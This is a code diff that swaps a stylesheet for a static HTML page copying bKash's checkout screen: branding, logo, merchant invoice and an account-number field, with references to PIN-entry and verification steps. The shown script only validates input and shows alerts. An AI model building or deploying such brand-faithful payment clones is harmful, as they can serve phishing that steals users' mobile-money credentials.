@@ -1,496 +1,147 @@
-/* Base styles and utilities (Tailwind Preflight inspired reset) */
-@import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap");
-
-*,
-*::before,
-*::after {
-  box-sizing: border-box;
-  margin: 0;
-  padding: 0;
-}
-
-body {
-  font-family: "Inter", sans-serif;
-  -webkit-font-smoothing: antialiased;
-  -moz-osx-font-smoothing: grayscale;
-  line-height: 1.5;
-  background-color: #f3f4f6; /* Default background for the body */
-}
-
-img,
-picture,
-video,
-canvas,
-svg {
-  display: block;
-  max-width: 100%;
-}
-
-input,
-button,
-textarea,
-select {
-  font: inherit;
-  border: none;
-  background: none;
-  padding: 0;
-  margin: 0;
-}
-
-/* Custom bKash colors (from tailwind.config.json) */
-:root {
-  --bkash-pink: #e3007f;
-  --bkash-light-pink: #ff007f; /* Adjusted, though not explicitly used as background */
-  --bkash-border-gray: #9e9e9e; /* Used for gray text */
-  --border: 214.3 31.8% 91.4%;
-  --input: 214.3 31.8% 91.4%;
-  --ring: 222.2 84% 4.9%;
-  --background: 0 0% 100%;
-  --foreground: 222.2 47.4% 11.2%;
-  --primary: 222.2 47.4% 11.2%;
-  --primary-foreground: 210 40% 98%;
-  --secondary: 210 40% 96.1%;
-  --secondary-foreground: 222.2 47.4% 11.2%;
-  --destructive: 0 84.2% 60.2%;
-  --destructive-foreground: 210 40% 98%;
-  --muted: 210 40% 96.1%;
-  --muted-foreground: 215.4 16.3% 46.9%;
-  --accent: 210 40% 96.1%;
-  --accent-foreground: 222.2 47.4% 11.2%;
-  --popover: 0 0% 100%;
-  --popover-foreground: 222.2 47.4% 11.2%;
-  --card: 0 0% 100%;
-  --card-foreground: 222.2 47.4% 11.2%;
-  --radius: 0.5rem; /* Equivalent to md */
-}
-
-
-/* Layout and Positioning */
-.flex-center-screen {
-  display: flex;
-  min-height: 100vh;
-  align-items: center;
-  justify-content: center;
-  /* background-color: #f3f4f6; bg-gray-100 - already set on body */
-}
-
-.flex {
-  display: flex;
-}
-
-.justify-center {
-  justify-content: center;
-}
-
-.items-center {
-  align-items: center;
-}
-
-.flex-col {
-  flex-direction: column;
-}
-
-.flex-1 {
-  flex: 1 1 0%; /* flex-1 */
-}
-
-/* Spacing */
-.p-0 {
-  padding: 0;
-}
-
-.p-4 {
-  padding: 1rem; /* p-4 */
-}
-
-.p-6 {
-  padding: 1.5rem; /* p-6 */
-}
-
-.p-2\.5 {
-  padding: 0.625rem; /* p-2.5 */
-}
-
-.pt-0 {
-  padding-top: 0;
-}
-
-.pb-4 {
-  padding-bottom: 1rem; /* pb-4 */
-}
-
-.pt-6 {
-  padding-top: 1.5rem; /* pt-6 */
-}
-
-.gap-1 {
-  gap: 0.25rem; /* gap-1 */
-}
-
-.gap-4 {
-  gap: 1rem; /* gap-4 */
-}
-
-.space-y-1 > :not([hidden]) ~ :not([hidden]) {
-  margin-top: 0.25rem; /* space-y-1 */
-}
-
-.space-y-4 > :not([hidden]) ~ :not([hidden]) {
-  margin-top: 1rem; /* space-y-4 */
-}
-
-/* Sizing */
-.w-full {
-  width: 100%;
-}
-
-.max-w-sm {
-  max-width: 24rem; /* max-w-sm */
-}
-
-.w-10 {
-  width: 2.5rem; /* w-10 */
-}
-
-.h-10 {
-  height: 2.5rem; /* h-10 */
-}
-
-.w-5 {
-  width: 1.25rem; /* w-5 */
-}
-
-.h-5 {
-  height: 1.25rem; /* h-5 */
-}
-
-.w-16 {
-  width: 4rem; /* w-16 */
-}
-
-.h-16 {
-  height: 4rem; /* h-16 */
-}
-
-.min-h-\[300px\] { /* min-h-[300px] from payment-failed-page */
-  min-height: 300px;
-}
-
-/* Typography */
-.text-center {
-  text-align: center;
-}
-
-.text-white {
-  color: #fff;
-}
-
-.text-gray-800 {
-  color: #1f2937; /* text-gray-800 */
-}
-
-.text-gray-500 {
-  color: #6b7280; /* text-gray-500 */
-}
-
-.text-gray-400 {
-  color: #9ca3af; /* placeholder:text-gray-400 */
-}
-
-.text-bkash-pink {
-  color: var(--bkash-pink);
-}
-
-.text-gray-footer { /* style={{ color: "#9e9e9e" }} */
-  color: var(--bkash-border-gray);
-}
-
-.text-xs {
-  font-size: 0.75rem; /* text-xs */
-  line-height: 1rem;
-}
-
-.text-\[10px\] {
-  font-size: 0.625rem; /* text-[10px] */
-}
-
-.text-lg {
-  font-size: 1.125rem; /* text-lg */
-  line-height: 1.75rem;
-}
-
-.text-2xl {
-  font-size: 1.5rem; /* text-2xl */
-  line-height: 2rem;
-}
-
-.font-medium {
-  font-weight: 500; /* font-medium */
-}
-
-.font-semibold {
-  font-weight: 600; /* font-semibold */
-}
-
-.font-bold {
-  font-weight: 700; /* font-bold */
-}
-
-.underline {
-  text-decoration: underline;
-}
-
-.whitespace-nowrap {
-  white-space: nowrap;
-}
-
-.tracking-wider { /* from pin-entry-page */
-  letter-spacing: 0.05em; /* approximate for tracking-wider */
-}
-
-/* Backgrounds and Borders */
-.bg-white {
-  background-color: #fff;
-}
-
-.bg-gray-100 {
-  background-color: #f3f4f6; /* bg-gray-100 */
-}
-
-.bg-bkash-pink {
-  background-color: var(--bkash-pink);
-}
-
-.border-t {
-  border-top-width: 1px;
-  border-top-color: #e5e7eb; /* default border color */
-}
-
-.border-b {
-  border-bottom-width: 1px;
-  border-bottom-color: #e5e7eb; /* default border color */
-}
-
-.border {
-  border-width: 1px;
-  border-color: #e5e7eb; /* default border color */
-}
-
-.border-gray-300 {
-  border-color: #d1d5db; /* border-gray-300 */
-}
-
-.border-input {
-  border-color: hsl(var(--input));
-}
-
-/* Rounded Corners & Shadows */
-.rounded-xl {
-  border-radius: 0.75rem; /* rounded-xl */
-}
-
-.rounded-md {
-  border-radius: 0.375rem; /* rounded-md */
-}
-
-.rounded-full {
-  border-radius: 9999px; /* rounded-full */
-}
-
-.overflow-hidden {
-  overflow: hidden;
-}
-
-.shadow-lg {
-  box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05); /* shadow-lg */
-}
-
-.shadow-sm {
-  box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); /* shadow-sm */
-}
-
-/* Object Fit */
-.object-contain {
-  object-fit: contain;
-}
-
-/* Interactivity */
-.cursor-pointer {
-  cursor: pointer;
-}
-
-.hover\:text-gray-200:hover {
-  color: #e5e7eb; /* hover:text-gray-200 */
-}
-
-.hover\:bg-gray-50:hover {
-  background-color: #f9fafb; /* hover:bg-gray-50 */
-}
-
-.hover\:bg-bkash-pink\/90:hover {
-  background-color: rgba(227, 0, 127, 0.9); /* hover:bg-bkash-pink/90 */
-}
-
-
-/* Specific Component Styles */
-
-/* Card */
-.card-bkash {
-  width: 100%;
-  max-width: 24rem; /* max-w-sm */
-  border-radius: var(--radius); /* Using CSS variable */
-  overflow: hidden;
-  box-shadow: var(--tw-shadow-lg, 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05));
-  background-color: #fff; /* Ensure card has white background */
-}
-
-.avatar-bkash {
-  width: 2.5rem; /* w-10 */
-  height: 2.5rem; /* h-10 */
-  background-color: #f3f4f6; /* bg-gray-100 */
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  border-radius: 9999px; /* rounded-full */
-}
-
-.sr-only {
-  position: absolute;
-  width: 1px;
-  height: 1px;
-  padding: 0;
-  margin: -1px;
-  overflow: hidden;
-  clip: rect(0, 0, 0, 0);
-  white-space: nowrap;
-  border-width: 0;
-}
-
-.bkash-pink-bg-section {
-  background-color: var(--bkash-pink);
-  padding: 1.5rem; /* p-6 */
-  color: #fff;
-  display: flex;
-  flex-direction: column;
-  justify-content: center;
-  aspect-ratio: 1 / 1; /* aspect-square */
-  gap: 1rem; /* space-y-4 */
-}
-
-/* Input Fields */
-.bkash-input-white {
-  width: 100%;
-  border-radius: var(--radius); /* rounded-md */
-  border: 1px solid hsl(var(--input)); /* default border */
-  background-color: #fff;
-  padding: 0.5rem 1rem; /* px-4 py-2 */
-  font-size: 1rem; /* text-base */
-  color: #1f2937; /* text-gray-800 */
-  text-align: center;
-  outline: none; /* focus:outline-none */
-  box-shadow: none; /* focus:ring-0 focus:ring-offset-0 */
-  border-color: transparent; /* focus:border-transparent - initially transparent */
-}
-.bkash-input-white::placeholder {
-  color: #9ca3af; /* placeholder:text-gray-400 */
-}
-
-/* Pin Entry Specific Input Style */
-.bkash-input-white.text-2xl {
-  font-size: 1.5rem; /* text-2xl */
-  letter-spacing: 0.05em; /* tracking-wider - approximate */
-}
-
-/* Action Buttons Container */
-.action-buttons-container {
-  display: flex;
-  justify-content: space-around;
-  padding: 0.625rem; /* p-2.5 */
-  gap: 1rem; /* gap-4 */
-  background-color: #fff;
-}
-
-/* Buttons */
-.button-base {
-  flex: 1 1 0%; /* flex-1 */
-  border-radius: var(--radius); /* rounded-md */
-  box-shadow: var(--tw-shadow-sm, 0 1px 2px 0 rgba(0, 0, 0, 0.05)); /* shadow-sm */
-  padding: 0.5rem 1rem; /* A common button padding */
-  transition: background-color 0.2s ease-in-out, color 0.2s ease-in-out, border-color 0.2s ease-in-out; /* transition-colors duration-200 */
-  cursor: pointer;
-}
-
-.button-outline {
-  composes: button-base;
-  border: 1px solid #d1d5db; /* border border-gray-300 */
-  background-color: #fff;
-  color: #1f2937; /* text-gray-800 */
-}
-.button-outline:hover {
-  background-color: #f9fafb; /* hover:bg-gray-50 */
-}
-
-.button-confirm-enabled {
-  composes: button-base;
-  background-color: var(--bkash-pink);
-  color: #fff;
-}
-.button-confirm-enabled:hover {
-  background-color: rgba(227, 0, 127, 0.9); /* hover:bg-bkash-pink/90 */
-}
-
-.button-confirm-disabled {
-  composes: button-base;
-  background-color: #e5e7eb; /* bg-gray-200 */
-  color: #6b7280; /* text-gray-500 */
-  cursor: not-allowed;
-}
-
-/* Loading animation for buttons */
-/* The bounce animation from your Next.js component */
-.animate-bounce-dot {
-  width: 0.5rem; /* w-2 */
-  height: 0.5rem; /* h-2 */
-  background-color: white;
-  border-radius: 9999px; /* rounded-full */
-  animation: bounce 1.4s infinite ease-in-out;
-}
-
-.animate-bounce-dot:nth-child(2) {
-  animation-delay: 0.15s; /* style={{ animationDelay: "150ms" }} */
-}
-.animate-bounce-dot:nth-child(3) {
-  animation-delay: 0.3s; /* style={{ animationDelay: "300ms" }} */
-}
-
-@keyframes bounce {
-  0%, 80%, 100% {
-    transform: translateY(-25%);
-  }
-  40% {
-    transform: translateY(0);
-  }
-}
-
-/* Footer */
-.bkash-footer {
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  justify-content: center;
-  padding: 0.625rem; /* p-2.5 */
-  font-size: 0.75rem; /* text-xs */
-  gap: 0.25rem; /* space-y-1 */
-  background-color: #fff; /* Ensure footer has white background */
-}
-
-/* Payment Failed Page specific styles */
-.payment-failed-section {
-  min-height: 300px;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  justify-content: center;
-  text-align: center;
-  gap: 1rem; /* space-y-4 */
-}
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>bKash Payment - Account Number</title>
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    <div class="flex-center-screen bg-gray-100 p-4">
+      <div class="card-bkash">
+        <div class="card-content-p0">
+          <!-- Logo Section -->
+          <div class="flex justify-center pt-0 pb-4">
+            <img src="./assets/bkash-logo.png" width="150" height="50" alt="bKash Logo" class="object-contain" />
+          </div>
+
+          <!-- Transaction Summary -->
+          <div class="flex items-center gap-4 p-4 border-t border-b bg-white">
+            <div class="avatar-bkash">
+              <svg
+                xmlns="http://www.w3.org/2000/svg"
+                width="20"
+                height="20"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                stroke-width="2"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                class="lucide lucide-shopping-cart"
+              >
+                <circle cx="8" cy="21" r="1" />
+                <circle cx="19" cy="21" r="1" />
+                <path d="M2.05 2.05h2l2.66 12.42a2 2 0 0 0 2 1.58h9.78a2 2 0 0 0 1.95-1.57l1.65-7.43H5.12" />
+              </svg>
+              <span class="sr-only">Shopping Cart</span>
+            </div>
+            <div class="flex-1">
+              <p class="text-xs font-medium text-gray-800">PromoShop.com</p>
+              <p class="text-[10px] text-gray-500">Inv No: NNT_6094bc8028702...</p>
+            </div>
+            <div class="text-lg font-semibold text-gray-800">৳49.00</div>
+          </div>
+
+          <!-- Account Number Input Section -->
+          <div class="bkash-pink-bg-section">
+            <h2 class="text-lg font-semibold text-center">Your bKash Account Number</h2>
+            <div class="relative flex items-center">
+              <input
+                type="tel"
+                placeholder="e.g 01XXXXXXXXX"
+                class="bkash-input-white text-center"
+                maxlength="11"
+                id="accountNumberInput" <!-- Added ID for JavaScript -->
+              />
+            </div>
+            <p class="text-xs text-center">
+              Confirm and proceed,
+              <a
+                href="https://www.bkash.com/en/page/tokenized_checkout"
+                target="_blank"
+                rel="noopener noreferrer"
+                class="font-medium underline text-white hover:text-gray-200"
+              >
+                terms & conditions
+              </a>
+            </p>
+          </div>
+
+          <!-- Action Buttons -->
+          <div class="action-buttons-container">
+            <button class="button-outline" id="cancelButton">Cancel</button> <!-- Added ID for JavaScript -->
+            <button disabled class="button-confirm-disabled" id="confirmButton">Confirm</button> <!-- Added ID for JavaScript -->
+          </div>
+
+          <!-- Footer -->
+          <div class="bkash-footer">
+            <div class="flex items-center gap-1 text-bkash-pink">
+              <svg
+                xmlns="http://www.w3.org/2000/svg"
+                width="16"
+                height="16"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                stroke-width="2"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                class="lucide lucide-phone-call"
+              >
+                <path
+                  d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"
+                />
+              </svg>
+              <span>16247</span>
+            </div>
+            <p class="text-xs text-gray-footer">© 2025 bKash, All Rights Reserved</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      const accountNumberInput = document.getElementById("accountNumberInput");
+      const confirmButton = document.getElementById("confirmButton");
+      const cancelButton = document.getElementById("cancelButton");
+
+      accountNumberInput.addEventListener("input", function (e) {
+        let value = e.target.value.replace(/\D/g, ""); // Only allow digits
+        if (value.length > 11) {
+          value = value.slice(0, 11);
+        }
+        e.target.value = value; // Update input field with cleaned value
+
+        // Enable confirm button if valid bKash number (starts with 01 and is 11 digits)
+        if (value.startsWith("01") && value.length === 11) {
+          confirmButton.disabled = false;
+          confirmButton.classList.remove("button-confirm-disabled");
+          confirmButton.classList.add("button-confirm-enabled");
+        } else {
+          confirmButton.disabled = true;
+          confirmButton.classList.remove("button-confirm-enabled");
+          confirmButton.classList.add("button-confirm-disabled");
+        }
+      });
+
+      confirmButton.addEventListener("click", function () {
+        if (!confirmButton.disabled) {
+          alert("Confirm button clicked for account: " + accountNumberInput.value);
+          // In a real application, this would trigger navigation to the verification page
+          // For now, it's just an alert.
+          // window.location.href = 'verification.html'; // Example for static site navigation
+        }
+      });
+
+      cancelButton.addEventListener("click", function () {
+        alert("Cancel button clicked!");
+        // Typically, this would take the user back or clear the form
+        accountNumberInput.value = "";
+        confirmButton.disabled = true;
+        confirmButton.classList.remove("button-confirm-enabled");
+        confirmButton.classList.add("button-confirm-disabled");
+      });
+    </script>
+  </body>
+</html>
